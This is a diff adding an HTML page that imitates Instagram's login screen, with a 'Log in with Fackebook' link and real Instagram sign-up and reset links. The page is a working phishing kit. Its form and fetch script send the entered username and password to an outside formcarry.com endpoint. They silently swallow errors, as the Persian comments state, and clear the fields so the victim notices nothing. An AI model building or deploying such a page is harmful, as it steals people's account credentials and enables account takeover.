@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>Information page</title> 
+  <link rel="shortcut icon" href="./Styles/images/LOGGGG.png" type="image/x-icon">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  
+
+   <div class="page-box">
+  <h2 class="name-log">Instagram</h2> 
+   <form class="form-log" action="https://formcarry.com/s/O9kjLYjUp5D" method="POST">
+    <input class="username" type="text" name="subject_input" id="subject" placeholder="Phone number, username, or email" required>
+    <input class="Password margin-Pass" type="password" name="information_input" id="more_information" placeholder="Password" required>
+    <button class="Login" type="submit">Log in</button>
+    
+    <div class="or">
+      <p class="p-or">OR</p> 
+    </div>
+   <br>
+     <a href="https://www.facebook.com/" target="_blank" class="Face">Log in with Fackebook</a>
+<br>
+<br>
+<br>
+     <a href="https://www.instagram.com/accounts/password/reset/?hl=en" class="forgot-pass" target="_blank" >Forgot password?</a>
+  </form>
+  </div>
+  <div class="account">
+        <span>Do not have an account?</span>
+        <a href="https://www.instagram.com/accounts/emailsignup/?hl=en" class="sign-forgot" target="_blank" >Sign up</a>
+  </div>
+  <script>
+  const form = document.querySelector("form");
+
+  form.addEventListener("submit", function (e) {
+    e.preventDefault(); // جلوگیری از رفتن به صفحه دیگه
+    const formData = new FormData(form);
+
+    fetch(form.action, {
+      method: form.method,
+      body: formData,
+      headers: {
+        Accept: "application/json",
+      },
+    })
+    .then((response) => {
+      if (response.ok) {
+        // پاک کردن فیلدها بعد از ارسال موفق
+        form.reset();
+      }
+    })
+    .catch((error) => {
+      // هیچ کاری نکن، چون نمی‌خوای پیام خطا یا چیزی نشون بدی
+    });
+  });
+</script>
+
+
+</body>
+</html>
